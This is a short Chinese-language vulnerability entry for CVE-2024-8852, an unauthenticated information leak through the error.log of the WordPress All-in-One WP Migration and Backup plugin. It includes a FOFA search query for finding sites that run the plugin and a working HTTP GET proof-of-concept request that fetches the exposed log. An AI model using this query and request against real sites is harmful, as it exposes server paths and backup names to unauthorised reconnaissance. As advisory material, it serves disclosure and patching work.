## WordPress All-in-One WP Migration and Backup 插件信息泄露漏洞 (CVE-2024-8852)
WordPress 中的 All-in-One WP Migration and Backup 插件在 7.87 之前版本，其日志文件 error.log 存在未授权访问问题。由于该文件默认可直接被外部访问，会导致敏感信息泄露，包括服务器绝对路径、备份文件名称以及调试信息，可能被攻击者用于后续渗透。
## fofa
```
body="/wp-content/plugins/all-in-one-wp-migration"
```

## POC
```
GET /wp-content/plugins/all-in-one-wp-migration/storage/error.log HTTP/1.1
Host: {{target}}
User-Agent: Mozilla/5.0
Accept: */*
Connection: close

```

